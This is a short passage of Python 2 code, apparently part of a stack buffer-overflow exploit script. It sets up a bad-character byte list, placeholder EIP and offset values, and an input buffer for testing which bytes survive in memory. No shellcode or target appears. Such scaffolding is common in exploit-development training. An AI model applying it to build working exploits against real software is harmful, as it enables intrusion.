...
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    ...
    eip = "B" * 4
    offset = "C" * 8
    lim_bad_chars = badchars[240:255]
    print ''.join(r'\x%02X'%ord(ch) for ch in lim_bad_chars)
    # printchars = unicode(badchars[:24].strip())
    # print(printchars.strip().decode('hex'))
    inputBuffer = filler + eip + lim_bad_chars
